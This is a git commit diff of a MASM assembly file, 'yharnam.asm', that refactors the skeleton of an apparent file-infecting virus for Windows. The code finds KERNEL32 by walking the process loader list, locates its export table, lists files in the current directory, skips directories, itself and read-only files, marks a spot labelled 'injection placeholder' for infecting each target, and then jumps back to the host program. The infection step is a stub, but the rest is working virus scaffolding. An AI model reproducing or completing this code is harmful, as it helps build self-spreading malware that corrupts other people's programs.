672a2edb6f0e850f584d7a512f74ae117c974b10
Alexandre Paillier <alexandre.paillier@epitech.eu>
2017-03-01 01:45:15 +0100

    Cleaned up code with better struct handling; use of fewer instructions; assembled code should be smaller

--- yharnam.asm
+++ yharnam.asm
@@ -17,9 +17,6 @@ option casemap:none
       includelib \masm32\lib\kernel32.lib
 
 .data
-	; helper variable, only for syntax purposes,
-	; to move within a structure without naming the first element
-	cStruct             DWORD 0
 .code
 
 data:
@@ -43,17 +40,16 @@ _getAddr_:
 	; ->Ldr / get the PEB_LDR_DATA struct
 	mov edx, (PEB PTR [edx]).Ldr
 	; ->InMemoryOrderModuleList / gets the loaded modules linked list
-	add edx, (cStruct.PEB_LDR_DATA.InMemoryOrderModuleList - cStruct.PEB_LDR_DATA)
+	lea edx, (PEB_LDR_DATA PTR [edx]).InMemoryOrderModuleList
 
 	; loop through the linked list until we match with "KERNEL32.DLL"
 	; partial check : length=12; name[0]=K; name[5]=L; name[7]=2
 	; should be enough
 loop_find_kernel32:
 	; ->FullDllName / get the UNICODE_STRING struct
-	mov eax, edx
-	add eax, (cStruct.LDR_DATA_TABLE_ENTRY.FullDllName - cStruct.LDR_DATA_TABLE_ENTRY)
-	; ->Length
-	mov bx, [eax]
+	lea eax, (LDR_DATA_TABLE_ENTRY PTR [edx]).FullDllName
+	; ->Len
+	mov bx, (UNICODE_STRING PTR [eax]).Len
 	; check the length
 	cmp bx, (12 * sizeof WCHAR)
 	jne loop_find_kernel32_continue
@@ -79,87 +75,73 @@ loop_find_kernel32_continue:
 loop_find_kernel32_end:
 	; ->DllBase, for some reason, does not hold the base address
 	; instead ->Reserved2[0] does
-	mov edx, [edx + (cStruct.LDR_DATA_TABLE_ENTRY.Reserved2 - cStruct.LDR_DATA_TABLE_ENTRY) + (sizeof PVOID * 0)]
+	mov edx, (LDR_DATA_TABLE_ENTRY PTR [edx]).Reserved2 + (sizeof DWORD * 0)
 	; get PE header (base address + offset from the DOS header)
 	add edx, [edx + 03Ch]
+	; get export table
+	add edx, [edx + 078h]
 
 	pop ebx
-	; allocate space on the stack
-	sub esp, sizeof STACK_STORAGE
+	; allocate space on the stack, sp register instead of esp because
+	; the structure size fits in a WORD, saves on instruction size
+	sub sp, sizeof STACK_STORAGE
 
-	mov edx, esp
+	lea edx, (STACK_STORAGE PTR [esp]).currentExe
 	push MAX_PATH
-	add edx, (cStruct.STACK_STORAGE.currentExe - cStruct.STACK_STORAGE)
 	push edx
 	push NULL
 	call GetModuleFileName ; get current .exe full file path
 
-	mov edx, esp
-	add edx, (cStruct.STACK_STORAGE.fileStruct - cStruct.STACK_STORAGE)
+	lea edx, (STACK_STORAGE PTR [esp]).fileStruct
 	push edx
-	mov edx, ebx
-	add edx, (fileFilter - data)
+	lea edx, [ebx + (fileFilter - data)]
 	push edx
 	call FindFirstFile
 
 	cmp eax, INVALID_HANDLE_VALUE
 	je loop_find_file_end
 
-	mov edx, esp
-	add edx, (cStruct.STACK_STORAGE.searchHandle - cStruct.STACK_STORAGE)
-	mov [edx], eax
+	mov (STACK_STORAGE PTR [esp]).searchHandle, eax
 loop_find_file:
 	; check file and put it on the stack if needed
-	mov eax, esp ; save stack "base" address
+	lea edx, (STACK_STORAGE PTR [esp]).targetName
+	lea eax, (WIN32_FIND_DATA PTR (STACK_STORAGE PTR [esp]).fileStruct).cFileName
 	push NULL
-	mov edx, eax
-	add edx, (cStruct.STACK_STORAGE.targetName - cStruct.STACK_STORAGE)
 	push edx
 	push MAX_PATH
-	mov edx, eax
-	add edx, (cStruct.STACK_STORAGE.fileStruct - cStruct.STACK_STORAGE)
-	add edx, (cStruct.WIN32_FIND_DATA.cFileName - cStruct.WIN32_FIND_DATA)
-	push edx
+	push eax
 	call GetFullPathName ; get absolute file path
 	
-	mov edx, esp ; check if it's a directory
-	add edx, (cStruct.STACK_STORAGE.fileStruct - cStruct.STACK_STORAGE)
-	mov edx, [edx + (cStruct.WIN32_FIND_DATA.dwFileAttributes - cStruct.WIN32_FIND_DATA)]
+	; check if it's a directory
+	mov edx, (WIN32_FIND_DATA PTR (STACK_STORAGE PTR [esp]).fileStruct).dwFileAttributes
 	and edx, FILE_ATTRIBUTE_DIRECTORY
 	cmp edx, FILE_ATTRIBUTE_DIRECTORY
 	je loop_find_file_continue
 
-	mov eax, esp
-	mov edx, eax
-	add edx, (cStruct.STACK_STORAGE.targetName - cStruct.STACK_STORAGE)
+	lea edx, (STACK_STORAGE PTR [esp]).targetName
+	lea eax, (STACK_STORAGE PTR [esp]).currentExe
 	push edx
-	mov edx, eax
-	add edx, (cStruct.STACK_STORAGE.currentExe - cStruct.STACK_STORAGE)
-	push edx
+	push eax
 	call lstrcmp ; check if this is the program
 	cmp eax, 0
 	je loop_find_file_continue
 
-	mov edx, esp ; check if it's a read-only file
-	add edx, (cStruct.STACK_STORAGE.fileStruct - cStruct.STACK_STORAGE)
-	mov edx, [edx + (cStruct.WIN32_FIND_DATA.dwFileAttributes - cStruct.WIN32_FIND_DATA)]
+	; check if it's a read-only file
+	mov edx, (WIN32_FIND_DATA PTR (STACK_STORAGE PTR [esp]).fileStruct).dwFileAttributes
 	and edx, FILE_ATTRIBUTE_READONLY
 	cmp edx, FILE_ATTRIBUTE_READONLY
 	je loop_find_file_continue
 
-;	injection
+;	injection "placeholder"
 	push 0AABBCCDDh
 	pop eax
 ;
 
 loop_find_file_continue:
-	mov eax, esp
-	mov edx, eax
-	add edx, (cStruct.STACK_STORAGE.fileStruct - cStruct.STACK_STORAGE)
+	lea edx, (STACK_STORAGE PTR [esp]).fileStruct
+	mov eax, (STACK_STORAGE PTR [esp]).searchHandle
 	push edx
-	mov edx, eax
-	add edx, (cStruct.STACK_STORAGE.searchHandle - cStruct.STACK_STORAGE)
-	push [edx]
+	push eax
 	call FindNextFile
 	cmp eax, TRUE
 	je loop_find_file
@@ -168,7 +150,8 @@ loop_find_file_end:
 	mov eax, [ebx + (returnAddr - data)]
 	cmp eax, 0
 	jne return_to_exec
-	invoke ExitProcess, 0
+	push 0
+	call ExitProcess
 return_to_exec:
 	jmp eax
 
